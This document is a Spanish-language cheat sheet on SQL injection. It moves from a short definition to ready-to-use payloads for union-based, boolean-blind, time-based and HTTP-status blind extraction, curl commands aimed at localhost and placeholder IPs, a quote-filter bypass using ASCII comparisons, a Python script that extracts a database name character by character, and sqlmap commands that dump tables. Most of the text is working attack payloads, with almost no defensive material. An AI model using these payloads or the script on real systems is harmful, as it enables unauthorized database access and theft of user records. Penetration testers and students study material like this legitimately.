## 📚 **Índice 

- [[#📌 1. ¿Qué es SQL Injection (SQLi)?]]
- [[#🔍 2. Comprobación básica de vulnerabilidad]]
- [[#📚 3. Tipos de SQL Injection]]
- [[#🚀 4. SQL Injection Union-Based (con metodología limpia)]]
    - [[#4.1 — Detectar número de columnas]]
    - [[#4.2 — Identificar la base de datos actual]]
    - [[#4.3 — Enumerar bases de datos]]
    - [[#4.4 — Enumerar tablas de una base específica]]
    - [[#4.5 — Enumerar columnas]]
    - [[#4.6 — Extraer registros]]
- [[#🛡️ 5. Blind SQL Injection (Boolean-Based)]]
    - [[#✔ 5.1 — Comprobación True/False]]
    - [[#✔ 5.2 — Longitud del nombre de la base]]
    - [[#✔ 5.3 — Extraer caracteres (con comillas)]]
- [[#🔥 6. Blind SQL Injection sin comillas (ASCII-based)]]
- [[#⏱️ 7. Time-Based SQL Injection]]
    - [[#7.1 — Confirmar vulnerabilidad]]
    - [[#7.2 — Extraer una letra]]
    - [[#7.3 — Búsqueda binaria con ASCII]]
- [[#🌐 8. Blind SQL Injection por Código HTTP (curl)]]
    - [[#8.1 — Usar solo encabezados]]
    - [[#8.2 — True / False]]
    - [[#8.3 — Longitud]]
    - [[#8.4 — Extraer letra]]
- [[#✅ 1. Payload clásico (con comillas)]]
- [[#✅ 2. Payload sin comillas (cuando están restringidas)]]
- [[#🔥 3. Payloads más avanzados: búsqueda binaria (muy eficiente)]]
- [[#📌 4. Sintaxis completa para enumerar cualquier posición]]
- [[#🧪 5. Ejemplo completo, ordenado]]
- [[#⚡ 9. Script conceptual (Time-Based)]]
- [[#🧩 10. Tabla de práctica SQL]]
- [[#⚙️ 11. SQLMap — Workflow resumido]]
- [[#🧩 12. Resumen final]]


---
# 📌 **1. ¿Qué es SQL Injection (SQLi)?**

SQL Injection es una vulnerabilidad que ocurre cuando una aplicación web:

- Inserta datos del usuario dentro de una consulta SQL
    
- **Sin validarlos ni sanitizarlos**
    
- Permitiendo que el atacante **modifique la lógica** de la consulta
    

Ejemplo vulnerable:

```sql
SELECT * FROM users WHERE email='$email' AND pass='$pass';
```

Si `$email` = `' OR 1=1 -- -`  
→ la condición se vuelve siempre verdadera.

---

# 🔍 **2. Comprobación básica de vulnerabilidad**

```
' OR 1=1 -- -
```

Si la página:

- carga igual → vulnerable
    
- cambia → filtra pero sigue peligrosa
    
- rompe → vulnerable pero mal manejada
    

---

# 📚 **3. Tipos de SQL Injection**

## 1️⃣ Error-Based

Se basa en errores SQL visibles para extraer información interna.

## 2️⃣ Boolean-Based Blind

Deduces TRUE/FALSE según cambios en la página.

## 3️⃣ Time-Based Blind

Deduces TRUE/FALSE según **tiempo de respuesta**.

## 4️⃣ Union-Based

Inserta resultados adicionales con `UNION SELECT`.

## 5️⃣ Stacked Queries

Permite ejecutar varias sentencias (`; DROP TABLE users;`).

---

# 🚀 **4. SQL Injection Union-Based 
## 4.1 — Detectar número de columnas

Cuando haces:

```
?id=9999' UNION SELECT 1,2,database() -- -
```

Estás:

- Usando un ID inexistente (9999)
    
- Probando columnas
    
- Hasta que la página **no dé error**
    

Regla:

- 1 columna → `UNION SELECT database()`
    
- 2 columnas → `UNION SELECT 1,database()`
    
- 3 columnas → `UNION SELECT 1,2,database()`
    
- N columnas → `UNION SELECT 1,2,3...N-1,database()`
    

---

## 4.2 — Identificar la base de datos actual

```
' UNION SELECT 1,2,database() -- -
```

---

## 4.3 — Enumerar bases de datos

Forma ideal:

```sql
' UNION SELECT 1,2,group_concat(schema_name)
FROM information_schema.schemata -- -
```

Si no muestra todas, usar:

```sql
LIMIT 0,1
LIMIT 1,1
LIMIT 2,1
```

---

## 4.4 — Enumerar tablas de una base específica

```sql
' UNION SELECT 1,2,table_name
FROM information_schema.tables
WHERE table_schema="registration" -- -
```

---

## 4.5 — Enumerar columnas

```sql
' UNION SELECT 1,2,column_name
FROM information_schema.columns
WHERE table_schema="registration"
AND table_name="user" -- -
```

---

## 4.6 — Extraer registros

```sql
' UNION SELECT 1,2,group_concat(username,userhash,country,regtime)
FROM registration.user -- -
```

Nota:  
Si la tabla está en otra base → `database.tabla`.

---

# 🛡️ **5. Blind SQL Injection (Boolean-Based)**

La página **NO muestra errores**, pero cambia según TRUE/FALSE.

---

## ✔ 5.1 — Comprobación True/False

```sql
1' AND (SELECT 1)=1-- +
```

→ TRUE → la página se ve normal

```sql
1' AND (SELECT 1)=2-- +
```

→ FALSE → cambia, se rompe o devuelve menos contenido

---

## ✔ 5.2 — Longitud del nombre de la base

```sql
1' AND LENGTH(database())=6-- +
```

- Página igual → longitud = 6
    
- Página diferente → no es 6
    

---

## ✔ 5.3 — Extraer caracteres (con comillas)

```sql
1' AND SUBSTRING(database(),1,1)='t'-- +
```

Interpretación:

- Página igual → letra = 't'
    
- Página cambia → NO es 't'
    

---

# 🔥 **6. Blind SQL Injection sin comillas (ASCII-based)**

Para bypass cuando bloquean `'` y `"`, se usa:

```sql
ASCII(SUBSTRING(database(),1,1))
```

### Ejemplo:

```sql
1 AND ASCII(SUBSTRING(database(),1,1))=116
```

- 116 → 't'
    

### Búsqueda binaria:

```sql
1 AND ASCII(SUBSTRING(database(),1,1))>100
```

Permite romper cualquier filtro de comillas.

---

# ⏱️ **7. Time-Based SQL Injection**

## 7.1 — Confirmar vulnerabilidad

```sql
1' AND SLEEP(5)-- +
```

→ si tarda 5s → vulnerable

---

## 7.2 — Extraer una letra

```sql
1' AND IF(SUBSTRING(USER(),1,1)='r', SLEEP(5), 0)-- +
```

- Tarda → es 'r'
    
- No tarda → NO es 'r'
    

---

## 7.3 — Búsqueda binaria con ASCII

```sql
1' AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(5), 0)-- +
```

→ extremadamente eficiente

---

# 🌐 **8. Blind SQL Injection por Código HTTP (curl)**

A veces no cambia contenido ni tiempo, pero sí:

- 200
    
- 500
    
- 404
    
- 302
    

---

## 8.1 — Usar solo encabezados

```bash
curl -I "http://IP/vuln.php?id=1"
```

---

## 8.2 — True / False

```bash
curl -I "http://IP/vuln.php?id=1' AND 1=1-- -"
curl -I "http://IP/vuln.php?id=1' AND 1=2-- -"
```

Interpretación:

- 200 → TRUE
    
- 500/404 → FALSE
    

---

## 8.3 — Longitud

```bash
curl -I --get --data-urlencode "id=1 AND LENGTH(database())=6" http://localhost/searchUsers.php
```

---

## 8.4 — Extraer letra

Con comillas:

```bash
curl -I --get --data-urlencode "id=1' AND SUBSTRING(database(),1,1)='t'-- -" http://localhost
```

Sin comillas:

```bash
curl -I --get --data-urlencode "id=1 AND ASCII(SUBSTRING(database(),1,1))=116" http://localhost
```


# ✅ **1. Payload clásico (con comillas)**

Obtener **la primera letra** del `username` del user con `id = 1`:

```sql
SUBSTRING((SELECT username FROM users WHERE id=1),1,1)
```

### **Comprobando si la letra es 'a'**

```bash
curl -I --get --data-urlencode "id=1 AND SUBSTRING((SELECT username FROM users WHERE id=1),1,1)='a'" http://localhost/searchUsers.php
```

Interpretación:

- **200 OK** → primera letra = **'a'**
    
- **500 / 404** → NO es 'a'
    

---

# ✅ **2. Payload sin comillas (cuando están restringidas)**

Aquí usas **ASCII** para evitar `'` y `"`.  
Ejemplo: ASCII de `'a'` es **97**.

### **Comprobar si ASCII = 97 (‘a’)**

```bash
curl -I --get --data-urlencode "id=1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=97" http://localhost/searchUsers.php
```

Interpretación:

- **200 OK** → primera letra = `'a'`
    
- **otro código** → NO es `'a'`
    

---

# 🔥 **3. Payloads más avanzados: búsqueda binaria (muy eficiente)**

Así enumeras sin probar letra por letra.

### ¿ASCII de la primera letra es > 100?

```bash
curl -I --get --data-urlencode "id=1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))>100" http://localhost/searchUsers.php
```

### ¿ASCII < 109?

```bash
curl -I --get --data-urlencode "id=1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))<109" http://localhost/searchUsers.php
```

Cada respuesta TRUE/FALSE reduce el rango a la mitad.

---

# 📌 **4. Sintaxis completa para enumerar cualquier posición**

### Primera letra (posición 1)

```bash
ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))
```

### Segunda letra (posición 2)

```bash
ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),2,1))
```

### Tercera letra

```bash
ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),3,1))
```

Y así sucesivamente.

---

# 🧪 **5. Ejemplo completo, ordenado**

### **Probar si la primera letra es ‘m’ (ASCII 109)**

```bash
curl -I --get --data-urlencode "id=1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))=109" \
http://localhost/searchUsers.php
```

### **Probar si es mayor que 'h' (ASCII 104)**

```bash
curl -I --get --data-urlencode "id=1 AND ASCII(SUBSTRING((SELECT username FROM users WHERE id=1),1,1))>104" \
http://localhost/searchUsers.php
```


---

# ⚡ **9. Script conceptual (Time-Based)**

```python
import requests, time

url = "https://site.com/item?id="
charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
resultado = ""

for pos in range(1, 20):
    for c in charset:
        payload = f"1' AND IF(SUBSTRING(database(),{pos},1)='{c}', SLEEP(4), 0)-- -"
        inicio = time.time()
        requests.get(url + payload)
        if time.time() - inicio > 4:
            resultado += c
            print("Letra encontrada:", c)
            break

print("DB:", resultado)
```

---

# 🧩 **10. Tabla de práctica SQL**

```sql
CREATE TABLE scientist (id INTEGER, firstname VARCHAR(100), lastname VARCHAR(100));
INSERT INTO scientist VALUES (1, 'albert', 'einstein');
INSERT INTO scientist VALUES (2, 'isaac', 'newton');
INSERT INTO scientist VALUES (3, 'marie', 'curie');
SELECT * FROM scientist;
```

---

# ⚙️ **11. SQLMap — Workflow resumido**

## 1️⃣ Capturar petición

```
BurpSuite → Save → peticion.txt
```

## 2️⃣ Ejecutar SQLMap

```bash
sqlmap -r peticion.txt
```

## 3️⃣ Ver bases

```bash
sqlmap -r peticion.txt --dbs
```

## 4️⃣ Ver tablas

```bash
sqlmap -r peticion.txt -D base --tables
```

## 5️⃣ Dump

```bash
sqlmap -r peticion.txt -D base -T tabla --dump
```

---

# 🧩 **12. Resumen final**

- **Union-Based:** rápido, directo, cuando devuelve errores
    
- **Boolean-Based:** cambia contenido
    
- **Time-Based:** cambia tiempo
    
- **Status-Code Blind:** cambia HTTP code
    
- **ASCII Sin Comillas:** bypass total
    
- **SQLMap:** automatización full
    

---

